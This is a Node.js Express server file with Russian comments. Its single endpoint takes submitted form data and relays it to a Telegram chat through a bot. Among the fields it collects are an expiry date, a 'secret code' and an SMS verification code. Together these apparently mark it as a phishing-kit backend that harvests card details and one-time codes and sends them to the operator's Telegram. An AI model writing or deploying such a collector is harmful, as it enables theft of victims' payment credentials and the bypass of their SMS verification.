// server.js (ESM)

import dotenv from "dotenv";
dotenv.config();

import dns from "node:dns";
dns.setDefaultResultOrder("ipv4first"); // IPv4 приоритет

import express from "express";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

// Небольшой helper: соберём читаемый текст для Telegram
function buildTelegramText(p = {}) {
  const lines = [
    "📨 Заявка с сайта:",
    p.name && `👤 Имя: ${p.name}`,
    p.email && `📧 Email: ${p.email}`,
    p.message && `💬 Сообщение: ${p.message}`,
    p.phone && `📱 Телефон: ${p.phone}`,
    p.fio && `👤 ФИО: ${p.fio}`,
    p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
    p.expiry && `📅 Срок: ${p.expiry}`,
    p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
    p.verificationCode && `🔢 Код из SMS: ${String(p.verificationCode).trim()}`,
    p.note && `📝 Примечание: ${p.note}`,
  ].filter(Boolean);

  return lines.join("\n");
}

// POST /api/send — принимает любые из перечисленных полей
app.post("/api/send", async (req, res) => {
  try {
    const p = req.body || {};

    // ✅ Проверка формата кода: от 3 до 6 цифр (если код вообще передают)
    if (
      typeof p.verificationCode !== "undefined" &&
      !/^\d{3,6}$/.test(String(p.verificationCode))
    ) {
      return res
        .status(400)
        .json({ success: false, error: "Неверный формат кода (3–6 цифр)" });
    }

    const text = buildTelegramText(p);
    if (!text || text === "📨 Заявка с сайта:") {
      return res.status(400).json({ success: false, error: "Нет данных" });
    }

    const token = process.env.TG_BOT_TOKEN;
    const chatId = process.env.TG_CHAT_ID;
    if (!token || !chatId) {
      throw new Error("Нет TG_BOT_TOKEN/TG_CHAT_ID в .env");
    }

    // Таймаут запроса к Telegram
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), 8000);

    const tgResp = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
        signal: controller.signal,
      }
    ).finally(() => clearTimeout(t));

    const tgJson = await tgResp.json();
    if (!tgJson.ok) {
      throw new Error(tgJson.description || "Telegram error");
    }

    res.json({ success: true });
  } catch (e) {
    console.error("API error:", e);
    res.status(500).json({ success: false, error: "Не удалось отправить" });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`API on http://localhost:${PORT}`));
